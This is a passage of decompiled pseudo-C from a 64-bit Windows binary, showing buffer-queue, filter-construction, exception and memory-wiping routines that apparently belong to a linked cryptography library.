  (*(void (__fastcall **)(__int64 *, __int64 (__fastcall ***)(), __int64 *, void **, char))(v6 + 248))(
    v3,
    &v10,
    &v9,
    &qword_1400D8080,
    v7);
  return v9;
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (0000000140056DB0) ----------------------------------------------------
bool __fastcall sub_140056DB0(_QWORD *a1)
{
  __int64 v1; // rdx

  v1 = a1[5];
  return v1 == a1[6] && *(_QWORD *)(v1 + 40) == *(_QWORD *)(v1 + 32) && !a1[8];
}

//----- (0000000140056DD0) ----------------------------------------------------
_QWORD *__fastcall sub_140056DD0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  char v3; // al
  signed int v4; // edx
  int v6; // [rsp+30h] [rbp+8h]

  v2 = a1;
  v3 = (*(__int64 (__fastcall **)(__int64, const char *, int *, int *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "NodeSize",
         &int `RTTI Type Descriptor',
         &v6);
  v4 = 256;
  if ( v3 )
    v4 = v6;
  *(_QWORD *)(v2 + 32) = v4;
  return sub_140056840(v2);
}
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';

//----- (0000000140056E20) ----------------------------------------------------
__int64 __fastcall sub_140056E20(_QWORD *a1)
{
  _QWORD *v1; // rdx
  __int64 result; // rax

  v1 = (_QWORD *)a1[3];
  a1[4] = v1[5];
  a1[5] = 0i64;
  a1[6] = 0i64;
  a1[7] = v1[7];
  result = v1[8];
  a1[8] = result;
  return result;
}

//----- (0000000140056E50) ----------------------------------------------------
__int64 __fastcall sub_140056E50(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // r8
  __int64 v5; // rdi
  _QWORD *v6; // rbx
  __int64 v7; // rax
  __int64 v8; // rdx
  char v9; // ST20_1
  __int64 result; // rax
  _QWORD v11[3]; // [rsp+20h] [rbp-18h]

  v3 = a3;
  v4 = a1[8];
  v5 = a2;
  v6 = a1;
  if ( v4 )
  {
    v7 = *a1;
    v8 = a1[7];
    a1[8] = 0i64;
    v9 = 1;
    (*(void (__fastcall **)(_QWORD *, __int64, __int64, _QWORD, char))(v7 + 40))(a1, v8, v4, 0i64, v9);
  }
  result = v6[6];
  if ( v5 == *(_QWORD *)(result + 24) + *(_QWORD *)(result + 40) )
  {
    LOBYTE(v11[0]) = 1;
    result = (*(__int64 (__fastcall **)(_QWORD *, __int64, __int64, _QWORD, _QWORD))(*v6 + 40i64))(
               v6,
               v5,
               v3,
               0i64,
               v11[0]);
  }
  else
  {
    v6[8] = v3;
    v6[7] = v5;
    *((_BYTE *)v6 + 72) = 0;
  }
  return result;
}

//----- (0000000140056EE0) ----------------------------------------------------
__int64 __fastcall sub_140056EE0(__int64 a1)
{
  __int64 v1; // r9
  __int64 v2; // r8
  _QWORD *i; // rax
  __int64 v4; // rdx

  v1 = *(_QWORD *)(a1 + 24);
  v2 = 0i64;
  for ( i = *(_QWORD **)(v1 + 40); i; v2 += v4 )
  {
    v4 = i[5] - i[4];
    i = (_QWORD *)*i;
  }
  return v2 + *(_QWORD *)(v1 + 64) - *(_QWORD *)(a1 + 40);
}

//----- (0000000140056F10) ----------------------------------------------------
signed __int64 __fastcall sub_140056F10(__int64 a1, _BYTE *a2)
{
  _QWORD *v2; // rax
  __int64 v3; // r8
  char v4; // cl
  signed __int64 result; // rax

  v2 = *(_QWORD **)(a1 + 40);
  v3 = v2[4];
  if ( v2[5] == v3 )
  {
    if ( *(_QWORD *)(a1 + 64) )
    {
      result = 1i64;
      *a2 = **(_BYTE **)(a1 + 56);
    }
    else
    {
      result = 0i64;
    }
  }
  else
  {
    v4 = *(_BYTE *)(v3 + v2[3]);
    result = 1i64;
    *a2 = v4;
  }
  return result;
}

//----- (0000000140056F50) ----------------------------------------------------
__int64 __fastcall sub_140056F50(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rdi
  __int64 v3; // rbx
  char v4; // ST28_1
  __int64 v5; // rax
  __int64 v7; // [rsp+30h] [rbp-48h]
  __int64 (__fastcall **v8)(); // [rsp+38h] [rbp-40h]
  __int64 (__fastcall **v9)(); // [rsp+40h] [rbp-38h]
  __int64 v10; // [rsp+50h] [rbp-28h]
  __int64 v11; // [rsp+58h] [rbp-20h]
  __int64 v12; // [rsp+60h] [rbp-18h]

  v2 = a1;
  v3 = a2;
  sub_140036DA0((__int64)&v8, 0);
  v8 = &off_1400A8940;
  v4 = 1;
  v9 = off_1400A9A98;
  v12 = 0i64;
  v7 = 0i64;
  v5 = *v2;
  v10 = v3;
  v11 = 1i64;
  (*(void (__fastcall **)(__int64 *, __int64 (__fastcall ***)(), __int64 *, signed __int64, void **, char))(v5 + 256))(
    v2,
    &v8,
    &v7,
    1i64,
    &qword_1400D8080,
    v4);
  return v7;
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (0000000140057000) ----------------------------------------------------
__int64 __fastcall sub_140057000(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 *v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rdi
  char v6; // ST28_1
  __int64 v7; // rax
  __int64 v9; // [rsp+30h] [rbp-48h]
  __int64 (__fastcall **v10)(); // [rsp+38h] [rbp-40h]
  __int64 (__fastcall **v11)(); // [rsp+40h] [rbp-38h]
  __int64 v12; // [rsp+50h] [rbp-28h]
  __int64 v13; // [rsp+58h] [rbp-20h]
  __int64 v14; // [rsp+60h] [rbp-18h]

  v3 = a1;
  v4 = a2;
  v5 = a3;
  sub_140036DA0((__int64)&v10, 0);
  v10 = &off_1400A8940;
  v6 = 1;
  v11 = off_1400A9A98;
  v14 = 0i64;
  v9 = 0i64;
  v7 = *v3;
  v12 = v4;
  v13 = v5;
  (*(void (__fastcall **)(__int64 *, __int64 (__fastcall ***)(), __int64 *, __int64, void **, char))(v7 + 256))(
    v3,
    &v10,
    &v9,
    v5,
    &qword_1400D8080,
    v6);
  return v9;
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (00000001400570B0) ----------------------------------------------------
__int64 __fastcall sub_1400570B0(_QWORD *a1, char *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rdi
  char *v4; // r14
  _QWORD *v5; // rbx
  __int64 v6; // r8
  _QWORD *v7; // rbp
  __int64 v8; // rdx
  size_t *v9; // rax
  size_t v10; // rsi
  __int64 v11; // rcx
  unsigned __int64 v12; // rax
  _QWORD *v13; // rsi
  unsigned __int64 *v14; // rcx
  unsigned __int64 v15; // rbp
  void *v16; // rax
  _QWORD *v18; // [rsp+70h] [rbp+8h]
  unsigned __int64 v19; // [rsp+80h] [rbp+18h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = a1[8];
  if ( v6 )
  {
    a1[8] = 0i64;
    (*(void (__fastcall **)(_QWORD *, _QWORD, __int64, _QWORD, char))(*a1 + 40i64))(a1, a1[7], v6, 0i64, 1);
  }
  while ( 1 )
  {
    v18 = (_QWORD *)v3;
    v7 = (_QWORD *)v5[6];
    if ( !v4 || !v3 )
      break;
    v8 = v7[5];
    v19 = v7[2] - v8;
    v9 = &v19;
    if ( v19 >= v3 )
      v9 = (size_t *)&v18;
    v10 = *v9;
    v11 = v7[3];
    if ( (char *)(v8 + v11) != v4 )
      memcpy((void *)(v8 + v11), v4, v10);
    v7[5] += v10;
    if ( v10 >= v3 )
      break;
    v4 += v10;
    v3 -= v10;
    v19 = v3;
    if ( *((_BYTE *)v5 + 24) && v5[4] < 0x4000ui64 )
    {
      do
      {
        v12 = 2i64 * v5[4];
        v5[4] = v12;
      }
      while ( v12 < v3 && v12 < 0x4000 );
    }
    v13 = operator new(0x30ui64);
    v18 = v13;
    if ( v13 )
    {
      v14 = &v19;
      if ( v5[4] >= v3 )
        v14 = v5 + 4;
      v15 = *v14;
      v13[2] = *v14;
      sub_1400255A0(v15);
      if ( v15 )
        v16 = sub_14003A000(v15);
      else
        v16 = 0i64;
      v13[3] = v16;
      v13[5] = 0i64;
      v13[4] = 0i64;
      *v13 = 0i64;
    }
    else
    {
      v13 = 0i64;
    }
    *(_QWORD *)v5[6] = v13;
    v5[6] = *(_QWORD *)v5[6];
  }
  return 0i64;
}

//----- (0000000140057240) ----------------------------------------------------
__int64 __fastcall sub_140057240(_QWORD *a1, _QWORD *a2)
{
  __int64 v2; // r8
  __int64 v3; // rax

  v2 = *(_QWORD *)(a1[5] + 40i64) - *(_QWORD *)(a1[5] + 32i64);
  *a2 = v2;
  if ( v2 )
    return *(_QWORD *)(a1[5] + 24i64) + *(_QWORD *)(a1[5] + 32i64);
  v3 = a1[8];
  if ( !v3 )
    return *(_QWORD *)(a1[5] + 24i64) + *(_QWORD *)(a1[5] + 32i64);
  *a2 = v3;
  return a1[7];
}

//----- (0000000140057270) ----------------------------------------------------
__int64 __fastcall sub_140057270(__int64 a1, __int64 a2, unsigned __int64 *a3, __int64 a4, char a5)
{
  __int64 v5; // r13
  unsigned __int64 *v6; // r12
  __int64 v7; // r15
  __int64 v8; // r14
  unsigned __int64 v9; // rsi
  _QWORD *v10; // rdi
  unsigned __int64 v11; // rbx
  __int64 *v12; // rax
  __int64 v13; // rbx
  __int64 v14; // rax
  __int64 v15; // r8
  __int64 result; // rax
  __int64 v17; // rbx
  __int64 v18; // [rsp+20h] [rbp-C8h]
  __int64 v19; // [rsp+28h] [rbp-C0h]
  unsigned __int64 i; // [rsp+30h] [rbp-B8h]
  __int64 (__fastcall **v21)(); // [rsp+40h] [rbp-A8h]
  __int64 (__fastcall **v22)(); // [rsp+48h] [rbp-A0h]
  __int64 v23; // [rsp+58h] [rbp-90h]
  __int64 v24; // [rsp+60h] [rbp-88h]
  __int64 v25; // [rsp+68h] [rbp-80h]
  __int64 v26; // [rsp+70h] [rbp-78h]
  __int64 v27; // [rsp+78h] [rbp-70h]
  __int64 v28; // [rsp+80h] [rbp-68h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( a5 )
  {
    v9 = *a3;
    v10 = *(_QWORD **)(a1 + 40);
    for ( i = v9; v9; i = v9 )
    {
      if ( !v10 )
        break;
      v11 = v10[5] - v10[4];
      LOBYTE(v19) = 1;
      LODWORD(v18) = 0;
      if ( v9 < v11 )
        v11 = v9;
      (*(void (__fastcall **)(__int64, __int64, _QWORD, unsigned __int64, __int64, __int64, unsigned __int64))(*(_QWORD *)v7 + 280i64))(
        v7,
        v5,
        v10[4] + v10[3],
        v11,
        v18,
        v19,
        i);
      v10[4] += v11;
      v10 = (_QWORD *)*v10;
      v9 -= v11;
    }
    sub_1400567A0(v8);
    v12 = (__int64 *)&i;
    if ( *(_QWORD *)(v8 + 64) < v9 )
      v12 = (__int64 *)(v8 + 64);
    v13 = *v12;
    if ( *v12 )
    {
      v14 = *(_QWORD *)v7;
      v15 = *(_QWORD *)(v8 + 56);
      LOBYTE(v19) = 1;
      LODWORD(v18) = 0;
      if ( *(_BYTE *)(v8 + 72) )
        (*(void (__fastcall **)(__int64, __int64, __int64, __int64, __int64, __int64, unsigned __int64))(v14 + 280))(
          v7,
          v5,
          v15,
          v13,
          v18,
          v19,
          i);
      else
        (*(void (__fastcall **)(__int64, __int64, __int64, __int64, __int64, __int64, unsigned __int64))(v14 + 272))(
          v7,
          v5,
          v15,
          v13,
          v18,
          v19,
          i);
      *(_QWORD *)(v8 + 56) += v13;
      *(_QWORD *)(v8 + 64) -= v13;
      v9 -= v13;
    }
    *v6 -= v9;
    result = 0i64;
  }
  else
  {
    sub_140036DA0((__int64)&v21, 0);
    v21 = &off_1400AB808;
    v23 = v8;
    v24 = 0i64;
    v25 = 0i64;
    v26 = 0i64;
    v22 = off_1400A9A98;
    v27 = 0i64;
    v28 = 0i64;
    sub_140038B00((__int64)&v21);
    v17 = sub_140057440((__int64)&v21, v7, v6, v5, 0);
    (*(void (__fastcall **)(__int64, unsigned __int64))(*(_QWORD *)v8 + 168i64))(v8, *v6);
    result = v17;
  }
  return result;
}
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400AB808: using guessed type __int64 (__fastcall *off_1400AB808)();
// 1400DA7A8: using guessed type __int64 qword_1400DA7A8;

//----- (0000000140057440) ----------------------------------------------------
__int64 __fastcall sub_140057440(__int64 a1, __int64 a2, unsigned __int64 *a3, __int64 a4, char a5)
{
  _QWORD *v5; // r10
  unsigned __int64 v6; // rdi
  char v7; // r13
  __int64 v8; // r12
  unsigned __int64 *v9; // r14
  __int64 v10; // r15
  __int64 v11; // rbx
  __int64 result; // rax
  unsigned __int64 *v13; // rax
  unsigned __int64 v14; // rsi
  _QWORD *v15; // rdx
  unsigned __int64 *v16; // rsi
  __int64 *v17; // rax
  __int64 v18; // rbp
  __int64 v19; // [rsp+20h] [rbp-48h]
  __int64 v20[8]; // [rsp+28h] [rbp-40h]
  unsigned __int64 v21; // [rsp+70h] [rbp+8h]
  unsigned __int64 v22; // [rsp+80h] [rbp+18h]

  v5 = *(_QWORD **)(a1 + 32);
  v6 = *a3;
  v7 = a5;
  v8 = a4;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v21 = *a3;
  result = 0i64;
  if ( v5 )
  {
    while ( 1 )
    {
      v13 = &v22;
      LOBYTE(v20[0]) = v7;
      LODWORD(v19) = 0;
      v22 = v5[5] - v5[4] - *(_QWORD *)(v11 + 48);
      if ( v22 >= v6 )
        v13 = &v21;
      v14 = *v13;
      result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, unsigned __int64, __int64, __int64))(*(_QWORD *)v10 + 272i64))(
                 v10,
                 v8,
                 v5[3] + *(_QWORD *)(v11 + 48) + v5[4],
                 *v13,
                 v19,
                 v20[0]);
      if ( result )
        break;
      *(_QWORD *)(v11 + 40) += v14;
      v6 -= v14;
      v21 = v6;
      if ( !v6 )
      {
        *(_QWORD *)(v11 + 48) += v14;
        break;
      }
      v15 = **(_QWORD ***)(v11 + 32);
      *(_QWORD *)(v11 + 48) = 0i64;
      *(_QWORD *)(v11 + 32) = v15;
      v5 = v15;
      if ( !v15 )
        goto LABEL_7;
    }
  }
  else
  {
LABEL_7:
    if ( v6 )
    {
      v16 = (unsigned __int64 *)(v11 + 64);
      if ( *(_QWORD *)(v11 + 64) )
      {
        v17 = (__int64 *)&v21;
        if ( *v16 < v6 )
          v17 = (__int64 *)(v11 + 64);
        v18 = *v17;
        LOBYTE(v20[0]) = v7;
        LODWORD(v19) = 0;
        result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, __int64, __int64, __int64))(*(_QWORD *)v10 + 272i64))(
                   v10,
                   v8,
                   *(_QWORD *)(v11 + 56),
                   *v17,
                   v19,
                   v20[0]);
        if ( !result )
        {
          *(_QWORD *)(v11 + 56) += v18;
          *v16 -= v18;
          v6 -= v18;
        }
      }
    }
  }
  *v9 -= v6;
  return result;
}

//----- (0000000140057660) ----------------------------------------------------
__int64 __fastcall sub_140057660(__int64 a1, __int64 a2, _DWORD *a3, char a4)
{
  char v4; // bp
  _DWORD *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x28ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400ACA70;
    *((_DWORD *)v8 + 8) = *v5;
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400ACA70: using guessed type __int64 (__fastcall *off_1400ACA70)(void *);

//----- (0000000140057720) ----------------------------------------------------
__int64 __fastcall sub_140057720(__int64 a1, __int64 a2, _DWORD *a3, char a4)
{
  char v4; // bp
  _DWORD *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x28ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400ACA58;
    *((_DWORD *)v8 + 8) = *v5;
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400ACA58: using guessed type __int64 (__fastcall *off_1400ACA58)(void *);

//----- (00000001400577E0) ----------------------------------------------------
__int64 __fastcall sub_1400577E0(__int64 a1, __int64 a2, _DWORD *a3, char a4)
{
  char v4; // bl
  _DWORD *v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v11; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140053D40((__int64)&v11);
  v9 = sub_140057660(v8, v6, v5, v4);
  sub_140053CE0(v7, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v7;
}

//----- (0000000140057870) ----------------------------------------------------
__int64 __fastcall sub_140057870(__int64 a1, __int64 a2, _DWORD *a3, char a4)
{
  char v4; // bl
  _DWORD *v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v11; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140053D40((__int64)&v11);
  v9 = sub_140057720(v8, v6, v5, v4);
  sub_140053CE0(v7, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v7;
}

//----- (0000000140057900) ----------------------------------------------------
__int64 __fastcall sub_140057900(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140036DA0(a1, 0);
  *(_QWORD *)(v3 + 24) = v2;
  *(_QWORD *)(v3 + 32) = 0i64;
  *(_DWORD *)(v3 + 40) = 0;
  return v3;
}

//----- (0000000140057940) ----------------------------------------------------
__int64 __fastcall sub_140057940(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140036DA0(a1, 0);
  *(_QWORD *)(v3 + 24) = v2;
  *(_QWORD *)(v3 + 32) = 0i64;
  *(_DWORD *)(v3 + 40) = 0;
  *(_QWORD *)v3 = &off_1400ABF78;
  *(_QWORD *)(v3 + 8) = off_1400AC138;
  *(_QWORD *)(v3 + 48) = -1i64;
  *(_QWORD *)(v3 + 56) = 0i64;
  *(_QWORD *)(v3 + 64) = -1i64;
  *(_BYTE *)(v3 + 72) = 0;
  *(_QWORD *)(v3 + 88) = 0i64;
  *(_QWORD *)(v3 + 96) = 0i64;
  return v3;
}
// 1400ABF78: using guessed type __int64 (__fastcall *off_1400ABF78)(void *);
// 1400AC138: using guessed type __int64 (__fastcall *off_1400AC138[3])();

//----- (0000000140057B40) ----------------------------------------------------
__int64 __fastcall sub_140057B40(__int64 a1, __int64 a2, __int64 a3, char a4, int a5, _QWORD *a6, _QWORD *a7)
{
  char v7; // di
  __int64 v8; // r15
  __int64 v9; // rbx
  __int64 v10; // r14
  signed __int64 v11; // rcx
  signed __int64 v12; // rcx
  __int64 v13; // rdx
  int v14; // eax
  void (__fastcall ***v15)(_QWORD, signed __int64); // rcx

  v7 = a4;
  v8 = a3;
  v9 = a2;
  v10 = a1;
  sub_140036DA0(a1, 0);
  *(_QWORD *)(v10 + 24) = 0i64;
  *(_QWORD *)(v10 + 32) = 0i64;
  *(_DWORD *)(v10 + 40) = 0;
  *(_QWORD *)(v10 + 56) = 0i64;
  *(_QWORD *)(v10 + 64) = 0i64;
  *(_QWORD *)v10 = &off_1400AC328;
  *(_QWORD *)(v10 + 8) = off_1400AC4A0;
  *(_QWORD *)(v10 + 72) = v9;
  *(_BYTE *)(v10 + 80) = v7;
  *(_DWORD *)(v10 + 84) = 0;
  *(_QWORD *)(v10 + 88) = 0i64;
  v11 = v10 + 96;
  *(_QWORD *)(v11 + 24) = 15i64;
  *(_QWORD *)(v11 + 16) = 0i64;
  *(_BYTE *)v11 = 0;
  sub_140004DF0((void *)(v10 + 96), a6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v12 = v10 + 128;
  *(_QWORD *)(v12 + 24) = 15i64;
  *(_QWORD *)(v12 + 16) = 0i64;
  *(_BYTE *)v12 = 0;
  sub_140004DF0((void *)(v10 + 128), a7, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v14 = a5;
  if ( a5 < 0 )
    v14 = (*(__int64 (__cdecl **)(_QWORD, __int64))(**(_QWORD **)(v10 + 72) + 56i64))(*(_QWORD *)(v10 + 72), v13);
  *(_DWORD *)(v10 + 84) = v14;
  v15 = *(void (__fastcall ****)(_QWORD, signed __int64))(v10 + 24);
  if ( v15 )
    (**v15)(v15, 1i64);
  *(_QWORD *)(v10 + 24) = v8;
  return v10;
}
// 1400AC328: using guessed type __int64 (__fastcall *off_1400AC328)(void *);
// 1400AC4A0: using guessed type __int64 (__fastcall *off_1400AC4A0[3])();

//----- (0000000140057C60) ----------------------------------------------------
_QWORD *__fastcall sub_140057C60(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  _QWORD *v4; // rax
  _QWORD *v5; // rbx

  v2 = a2;
  v3 = (_QWORD *)a1;
  sub_1400579B0(a1);
  *v3 = &off_1400AC7F0;
  v3[1] = off_1400AC9B0;
  v3[17] = v2;
  if ( v2 )
  {
    v4 = operator new(0x28ui64);
    v5 = v4;
    if ( v4 )
    {
      sub_140036DA0((__int64)v4, 0);
      *v5 = &off_1400AC690;
      v5[1] = off_1400A9A98;
      v5[3] = v3;
      *((_BYTE *)v5 + 32) = 0;
    }
    else
    {
      v5 = 0i64;
    }
    (*(void (__fastcall **)(_QWORD, _QWORD *))(*(_QWORD *)v3[17] + 344i64))(v3[17], v5);
  }
  return v3;
}
// 1400579B0: using guessed type __int64 __fastcall sub_1400579B0(__int64);
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400AC690: using guessed type __int64 (__fastcall *off_1400AC690)();
// 1400AC7F0: using guessed type __int64 (__fastcall *off_1400AC7F0)(void *);
// 1400AC9B0: using guessed type __int64 (__fastcall *off_1400AC9B0[3])();

//----- (0000000140057D20) ----------------------------------------------------
_QWORD *__fastcall sub_140057D20(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rbx
  _QWORD *v5; // rdi
  __int64 v6; // rax
  int v8; // [rsp+20h] [rbp-38h]
  __int64 v9; // [rsp+28h] [rbp-30h]
  __int64 v10; // [rsp+30h] [rbp-28h]
  char v11; // [rsp+38h] [rbp-20h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+40h] [rbp-18h]

  v9 = -2i64;
  v4 = a2;
  v5 = (_QWORD *)a1;
  v10 = a1;
  v8 = a4;
  sub_140057940(a1, a3);
  v5[19] = 0i64;
  v5[20] = 0i64;
  *v5 = &off_1400AC150;
  v5[1] = off_1400AC310;
  v5[21] = v4;
  v5[22] = 4i64;
  v6 = sub_140057870((__int64)&v11, (__int64)"BlockPaddingScheme", &v8, 1);
  sub_140059720(v5, v6);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v5;
}
// 1400AC150: using guessed type __int64 (__fastcall *off_1400AC150)(void *);
// 1400AC310: using guessed type __int64 (__fastcall *off_1400AC310[3])();

//----- (0000000140057DD0) ----------------------------------------------------
std::exception *__fastcall sub_140057DD0(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  sub_140023760(a1, a2);
  *(_QWORD *)v2 = &off_1400A8798;
  return v2;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140057E00) ----------------------------------------------------
std::exception *__fastcall sub_140057E00(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140057E80) ----------------------------------------------------
_DWORD *__fastcall sub_140057E80(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 3;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140057F50) ----------------------------------------------------
__int64 __fastcall sub_140057F50(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rax
  int v8; // [rsp+20h] [rbp-38h]
  __int64 v9; // [rsp+28h] [rbp-30h]
  __int64 v10; // [rsp+30h] [rbp-28h]
  char v11; // [rsp+38h] [rbp-20h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+40h] [rbp-18h]

  v9 = -2i64;
  v4 = a2;
  v5 = a1;
  v10 = a1;
  v8 = a4;
  sub_140057940(a1, a3);
  *(_QWORD *)v5 = &off_1400AC4B8;
  *(_QWORD *)(v5 + 8) = off_1400AC678;
  *(_QWORD *)(v5 + 136) = v4;
  *(_QWORD *)(v5 + 144) = 0i64;
  *(_DWORD *)(v5 + 152) = 0;
  *(_QWORD *)(v5 + 168) = 0i64;
  *(_QWORD *)(v5 + 176) = 0i64;
  *(_BYTE *)(v5 + 184) = 0;
  v6 = sub_1400577E0((__int64)&v11, (__int64)"SignatureVerificationFilterFlags", &v8, 1);
  sub_140059720((_QWORD *)v5, v6);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v5;
}
// 1400AC4B8: using guessed type __int64 (__fastcall *off_1400AC4B8)(void *);
// 1400AC678: using guessed type __int64 (__fastcall *off_1400AC678[4])();

//----- (0000000140058010) ----------------------------------------------------
void __fastcall sub_140058010(__int64 a1)
{
  void *v1; // rdx

  v1 = *(void **)(a1 + 16);
  memset(v1, 0, *(_QWORD *)(a1 + 8));
  free(v1);
}

//----- (0000000140058040) ----------------------------------------------------
void __fastcall sub_140058040(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void (__fastcall ***v3)(_QWORD, signed __int64); // rcx

  v1 = a1;
  v2 = *(void **)(a1 + 96);
  memset(*(void **)(a1 + 96), 0, *(_QWORD *)(a1 + 88));
  free(v2);
  v3 = *(void (__fastcall ****)(_QWORD, signed __int64))(v1 + 24);
  if ( v3 )
    (**v3)(v3, 1i64);
}

//----- (00000001400580A0) ----------------------------------------------------
void __fastcall sub_1400580A0(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void (__fastcall ***v3)(_QWORD, signed __int64); // rcx

